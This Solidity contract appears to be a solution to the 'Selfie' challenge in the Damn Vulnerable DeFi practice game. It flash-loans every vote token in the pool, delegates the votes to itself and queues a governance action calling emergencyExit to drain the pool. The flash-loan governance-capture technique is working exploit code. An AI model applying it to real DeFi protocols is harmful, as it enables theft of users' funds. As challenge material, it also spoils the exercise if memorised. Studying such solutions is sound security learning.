// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";

contract SelfieAttack is IERC3156FlashBorrower {

    DamnValuableVotes private immutable voteToken;
    SimpleGovernance  private immutable governance;
    SelfiePool private immutable pool;
    address private immutable recoveryAccount;
    uint256 private immutable voteTokenAmount;
    uint256 public emergencyExitActionId;

    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recoveryAccount) {
        voteToken = _token;
        governance = _governance;
        pool = _pool;
        recoveryAccount = _recoveryAccount;
        voteTokenAmount = voteToken.balanceOf(address(pool));
    }


    function attack() public {
        // Flash loan all the tokens from the pool to gain control over the governance contract to queue emergency exit
        pool.flashLoan(IERC3156FlashBorrower(this), address(voteToken), voteTokenAmount, abi.encode("queueAction"));
    }

    /**
     * @dev Receive a flash loan.
     * @param initiator The initiator of the loan.
     * @param token The loan currency.
     * @param amount The amount of tokens lent.
     * @param fee The additional amount of tokens to repay.
     * @param data Arbitrary data structure, intended to contain user-defined parameters.
     * @return The keccak256 hash of "ERC3156FlashBorrower.onFlashLoan"
     */
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        require(msg.sender == address(pool), "SelfieAttack: Unauthorized");
        require(token == address(voteToken), "SelfieAttack: Invalid token");
        // delegate votes to the attacker
        voteToken.delegate(address(this));

        // queue emergency exit
        emergencyExitActionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", address(recoveryAccount)));
        // repay the flash loan
        voteToken.approve(address(pool), voteTokenAmount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
